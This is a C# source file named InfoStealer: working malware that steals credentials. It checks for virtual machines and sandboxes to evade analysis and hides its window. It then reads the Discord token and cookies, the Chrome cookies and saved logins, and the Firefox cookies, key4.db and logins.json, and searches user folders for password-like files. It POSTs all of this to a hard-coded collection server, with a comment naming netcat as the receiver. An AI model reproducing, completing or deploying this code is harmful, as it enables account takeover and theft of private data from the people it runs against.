using System;
using System.IO;
using System.Net;
using System.Text;
using System.Management;
using System.ComponentModel;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace InfoStealer
{
	public class DPAPI
	{
		// Wrapper for DPAPI CryptProtectData function.
		[DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
		private static extern
			bool CryptProtectData(ref DATA_BLOB pPlainText,
										string szDescription,
									ref DATA_BLOB pEntropy,
										IntPtr pReserved,
									ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
										int dwFlags,
									ref DATA_BLOB pCipherText);

		// Wrapper for DPAPI CryptUnprotectData function.
		[DllImport("crypt32.dll",
					SetLastError = true,
					CharSet = System.Runtime.InteropServices.CharSet.Auto)]
		private static extern
			bool CryptUnprotectData(ref DATA_BLOB pCipherText,
									ref string pszDescription,
									ref DATA_BLOB pEntropy,
										IntPtr pReserved,
									ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
										int dwFlags,
									ref DATA_BLOB pPlainText);

		// BLOB structure used to pass data to DPAPI functions.
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		internal struct DATA_BLOB
		{
			public int cbData;
			public IntPtr pbData;
		}

		// Prompt structure to be used for required parameters.
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		internal struct CRYPTPROTECT_PROMPTSTRUCT
		{
			public int cbSize;
			public int dwPromptFlags;
			public IntPtr hwndApp;
			public string szPrompt;
		}

		// Wrapper for the NULL handle or pointer.
		static private IntPtr NullPtr = ((IntPtr)((int)(0)));

		// DPAPI key initialization flags.
		private const int CRYPTPROTECT_UI_FORBIDDEN = 0x1;
		private const int CRYPTPROTECT_LOCAL_MACHINE = 0x4;


		private static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
		{
			ps.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
			ps.dwPromptFlags = 0;
			ps.hwndApp = NullPtr;
			ps.szPrompt = null;
		}

		private static void InitBLOB(byte[] data, ref DATA_BLOB blob)
		{
			// Use empty array for null parameter.
			if (data == null) data = new byte[0];

			// Allocate memory for the BLOB data.
			blob.pbData = Marshal.AllocHGlobal(data.Length);

			// Make sure that memory allocation was successful.
			if (blob.pbData == IntPtr.Zero) throw new Exception("Unable to allocate data buffer for BLOB structure.");

			// Specify number of bytes in the BLOB.
			blob.cbData = data.Length;

			// Copy data from original source to the BLOB structure.
			Marshal.Copy(data, 0, blob.pbData, data.Length);
		}

		// Flag indicating the type of key. DPAPI terminology refers to
		// key types as user store or machine store.
		public enum KeyType { UserKey = 1, MachineKey };

		public static string Decrypt(string cipherText)
		{
			string description;
			return Decrypt(cipherText, String.Empty, out description);
		}

		public static string Decrypt(string cipherText, out string description)
		{
			return Decrypt(cipherText, String.Empty, out description);
		}

		public static string Decrypt(string cipherText, string entropy, out string description)
		{
			// Make sure that parameters are valid.
			if (entropy == null) entropy = String.Empty;

			return Encoding.UTF8.GetString(Decrypt(Convert.FromBase64String(cipherText), Encoding.UTF8.GetBytes(entropy), out description));
		}

		public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
		{
			// Create BLOBs to hold data.
			DATA_BLOB plainTextBlob = new DATA_BLOB();
			DATA_BLOB cipherTextBlob = new DATA_BLOB();
			DATA_BLOB entropyBlob = new DATA_BLOB();

			// We only need prompt structure because it is a required
			// parameter.
			CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
			InitPrompt(ref prompt);

			// Initialize description string.
			description = String.Empty;

			try
			{
				// Convert ciphertext bytes into a BLOB structure.
				try
				{
					InitBLOB(cipherTextBytes, ref cipherTextBlob);
				}
				catch (Exception ex)
				{
					throw new Exception("Cannot initialize ciphertext BLOB.", ex);
				}

				// Convert entropy bytes into a BLOB structure.
				try
				{
					InitBLOB(entropyBytes, ref entropyBlob);
				}
				catch (Exception ex)
				{
					throw new Exception("Cannot initialize entropy BLOB.", ex);
				}

				// Disable any types of UI. CryptUnprotectData does not
				// mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of
				// supported flags so we will not set it up.
				int flags = CRYPTPROTECT_UI_FORBIDDEN;

				// Call DPAPI to decrypt data.
				bool success = CryptUnprotectData(ref cipherTextBlob,
													ref description,
													ref entropyBlob,
														IntPtr.Zero,
													ref prompt,
														flags,
													ref plainTextBlob);

				// Check the result.
				if (!success)
				{
					// If operation failed, retrieve last Win32 error.
					int errCode = Marshal.GetLastWin32Error();

					// Win32Exception will contain error message corresponding
					// to the Windows error code.
					throw new Exception(
						"CryptUnprotectData failed.", new Win32Exception(errCode));
				}

				// Allocate memory to hold plaintext.
				byte[] plainTextBytes = new byte[plainTextBlob.cbData];

				// Copy ciphertext from the BLOB to a byte array.
				Marshal.Copy(plainTextBlob.pbData,
								plainTextBytes,
								0,
								plainTextBlob.cbData);

				// Return the result.
				return plainTextBytes;
			}
			catch (Exception ex)
			{
				throw new Exception("DPAPI was unable to decrypt data.", ex);
			}
			// Free all memory allocated for BLOBs.
			finally
			{
				if (plainTextBlob.pbData != IntPtr.Zero)
					Marshal.FreeHGlobal(plainTextBlob.pbData);

				if (cipherTextBlob.pbData != IntPtr.Zero)
					Marshal.FreeHGlobal(cipherTextBlob.pbData);

				if (entropyBlob.pbData != IntPtr.Zero)
					Marshal.FreeHGlobal(entropyBlob.pbData);
			}
		}
	}

	internal class Program
	{
		// Setup Hidden window
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		const int SW_SHOW = 5;

		public struct s_data<T>
		{
			public T file_data = default(T);
			public string file_type = "File type undefined";

			public s_data() { }
		}

		static s_data<string> fill_data()
		{
			s_data<string> data = new s_data<string>();
			data.file_type = "[DEFAULT] File Type";
			data.file_data = "[DEFAULT] FILE DATA " + DateTime.Now + "\n\n";
			return data;


		}

		static void send_data(s_data<string> data, string server)
		{
			WebRequest request = WebRequest.Create(server);
			request.Method = "POST";
			request.ContentType = "[STRING]" + string.Join("", Encoding.ASCII.GetChars(Encoding.ASCII.GetBytes(data.file_type.ToCharArray())));  // Filter out non ASCII charakters
			byte[] byteArray = Encoding.UTF8.GetBytes(data.file_data + "\n");														// Add trailing newline to string
			request.ContentLength = byteArray.Length;
			Stream dataStream = request.GetRequestStream();
			dataStream.Write(byteArray, 0, byteArray.Length);
			request.Timeout = 1000;
			dataStream.Close();
			try { request.GetResponse(); } catch { }
		}

		static void send_data(s_data<byte[]> data, string server)
		{
			WebRequest request = WebRequest.Create(server);
			request.Method = "POST";
			request.ContentType = "[BYTES]" + string.Join("", Encoding.ASCII.GetChars(Encoding.ASCII.GetBytes(data.file_type.ToCharArray())));	// Filter out non ASCII charakters
			request.ContentLength = data.file_data.Length;
			Stream dataStream = request.GetRequestStream();
			dataStream.Write(data.file_data, 0, data.file_data.Length);
			request.Timeout = 200;
			dataStream.Close();
			try { request.GetResponse(); } catch { }
		}

		static bool is_VM()
		{

			// Check Manufacturer Strings
			try
			{
				var man_searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
				var man_items = man_searcher.Get();
				foreach (var man_item in man_items)
				{
					string manufacturer = man_item["Manufacturer"].ToString().ToLower();
					if ((manufacturer == "microsoft corporation" && man_item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
						|| manufacturer.Contains("vmware")
						|| man_item["Model"].ToString() == "VirtualBox")
					{
						return true;
					}
				}
			}
			catch { }

			try
			{
				string PC_Name = Environment.MachineName.ToUpperInvariant();
				if (PC_Name.Contains("VM") || PC_Name.Contains("VIRTUAL") || PC_Name.Contains("DEFEND") || PC_Name.Contains("VIRUS") || PC_Name.Contains("BOX") || PC_Name.Contains("MICROSOFT")) return true;       // Check machine name strings
			}
			catch { }

			try
			{
				string User_Name = Environment.UserName.ToUpperInvariant();
				if (User_Name.Contains("VM") || User_Name.Contains("VIRTUAL") || User_Name.Contains("DEFEND") || User_Name.Contains("VIRUS") || User_Name.Contains("BOX") || User_Name.Contains("MICROSOFT")) return true;       // Check machine name strings
			}
			catch { }

			try
			{
				if (Environment.ProcessorCount < 2) return true;                                                               // If less than 2 Processor cores
				if (Environment.TickCount <= 1500) return true;                                                                 // Time since computer started
			}
			catch { }

			// !TODO: Check total system memory

			return false;
		}

		static bool is_admin()
		{
			var id = WindowsIdentity.GetCurrent();
			return id.Owner != id.User;
		}

		static s_data<string> discord_token()
		{
			int offset = 0;
			string token = "";
			string token_file_string;
			s_data<string> exfil_data = new s_data<string>();
			exfil_data.file_type = "Discord Email::Token";
			// get list of every file in %appdata%\discord\...
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\");
			foreach (string file in files)
			{
				if (File.ReadAllText(file).Contains("token"))
				{
					string[] token_file_arr = File.ReadAllText(file).Split("token");
					try { token_file_string = token_file_arr[1]; } catch { token_file_string = token_file_arr[0]; }
					while (token_file_string[offset] != '\"') offset++;       // reach first "
					offset += 3;
					while (token_file_string[offset] != '\"')
					{
						token += token_file_string[offset];
						offset++;
					}
					//token += "\n\n";
					break;
				}
			}
			exfil_data.file_data = token;
			return exfil_data;
		}

		static s_data<byte[]> discord_cookies()
		{
			s_data<byte[]> exfil_data = new s_data<byte[]>();
			exfil_data.file_type = "Discord Cookies";
			exfil_data.file_data = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Cookies");
			return exfil_data;
		}

		static s_data<byte[]> browser_cookies_chrome()
		{
			s_data<byte[]> exfil_data = new s_data<byte[]>();
			exfil_data.file_type = "Chrome Cookies";
			exfil_data.file_data = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
			return exfil_data;
		}

		static s_data<byte[]> browser_passwords_chrome()
		{
			s_data<byte[]> exfil_data = new s_data<byte[]>();
			exfil_data.file_type = "Chrome Cookies";
			exfil_data.file_data = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data");
			return exfil_data;
		}

		static s_data<byte[]> browser_cookies_firefox()
		{
			string[] path;
			s_data<byte[]> exfil_data = new s_data<byte[]>();
			exfil_data.file_type = "Firefox Cookies";
			path = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\");
			if (path[0].Contains("release"))
			{
				exfil_data.file_data = File.ReadAllBytes(path[0] + "\\cookies.sqlite");
			}
			else
			{
				exfil_data.file_data = File.ReadAllBytes(path[1] + "\\cookies.sqlite");
			}
			return exfil_data;
		}

		static void send_browser_passwords_firefox(string target_IP)
		{
			string[] path;
			s_data<byte[]> exfil_data = new s_data<byte[]>();
			exfil_data.file_type = "Firefox Cookies db";
			path = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\");
			if (path[0].Contains("release"))
			{
				exfil_data.file_data = File.ReadAllBytes(path[0] + "\\key4.db");
				send_data(exfil_data, target_IP);

				exfil_data.file_type = "Firefox Cookies logins.json";
				exfil_data.file_data = File.ReadAllBytes(path[0] + "\\logins.json");
				send_data(exfil_data, target_IP);
			}
			else
			{
				exfil_data.file_data = File.ReadAllBytes(path[1] + "\\key4.db");
				send_data(exfil_data, target_IP);

				exfil_data.file_type = "Firefox Cookies logins.json";
				exfil_data.file_data = File.ReadAllBytes(path[1] + "\\logins.json");
				send_data(exfil_data, target_IP);
			}
		}

		static void send_pwd_files(bool admin, string target_IP)
		{
			s_data<byte[]> exfil_data = new s_data<byte[]>();

			// If admin search all data in user folder
			if (admin)
			{
				foreach (string file in Directory.EnumerateFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "*.*", SearchOption.AllDirectories))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						if (!file.ToUpper().Contains("\\DATA\\"))
						{
							exfil_data.file_type = "[PASSWORD FILE]" + file;
							try { exfil_data.file_data = File.ReadAllBytes(file); } catch { }
							send_data(exfil_data, target_IP);
						}
					}
				}
			}

			// Only search "open" Folders
			else
			{
				// User Root folder
				foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						exfil_data.file_type = "[PASSWORD FILE]" + file;
						try { exfil_data.file_data = File.ReadAllBytes(file); } catch { }
						send_data(exfil_data, target_IP);
					}
				}
				// Desktop and subfolders
				foreach (string file in Directory.EnumerateFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*", SearchOption.AllDirectories))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						exfil_data.file_type = "[PASSWORD FILE]" + file;
						try { exfil_data.file_data = File.ReadAllBytes(file); } catch { }
						send_data(exfil_data, target_IP);
					}
				}
				// User Documents folder
				/*foreach (string file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)))
				{
					if (file.ToUpper().Contains("PASS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
					{
						exfil_data.file_type = "[PASSWORD FILE]" + file;
						exfil_data.file_data = File.ReadAllBytes(file);
						send_data(exfil_data, target_IP);
					}
				}*/
				// Other Drives
				// https://www.codeproject.com/questions/308587/how-i-can-avoid-access-denied-path-exception-when for System Volume Information problem
				/*foreach (DriveInfo drive in DriveInfo.GetDrives())
				{
					if (!(drive.Name == "C:\\"))
					{
						foreach (string file in Directory.EnumerateFiles(drive.Name, "*.*", SearchOption.AllDirectories))
						{
							if (file.ToUpper().Contains("KEYPAS") || file.ToUpper().Contains("PWD") || file.ToUpper().Contains("DATEN") || file.ToUpper().Contains("DATA"))
							{
								exfil_data.file_type = "[PASSWORD FILE]" + file;
								exfil_data.file_data = File.ReadAllBytes(file);
								send_data(exfil_data, target_IP);
							}
						}
					}
				}*/
			}
		}

		static void admin_handler(string target_IP)
		{

		}

		public static int Main(string[] args)
		{
			if (is_VM()) return 255;
			// Hide Window
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
			string target_IP = "http://192.168.178.112:8000";

			if (is_admin()) admin_handler(target_IP);

			try { send_data(discord_token(), target_IP); } catch { }
			try { send_data(discord_cookies(), target_IP); } catch { }
			try { send_pwd_files(is_admin(), target_IP); } catch { }
			try { send_data(browser_cookies_chrome(), target_IP); } catch { }
			try { send_data(browser_passwords_chrome(), target_IP); } catch { }
			try { send_data(browser_cookies_firefox(), target_IP); } catch { }
			try { send_browser_passwords_firefox(target_IP); } catch { }

			return 0;
		}
	}
}

// Use netcat -ldk 8000 on recieving end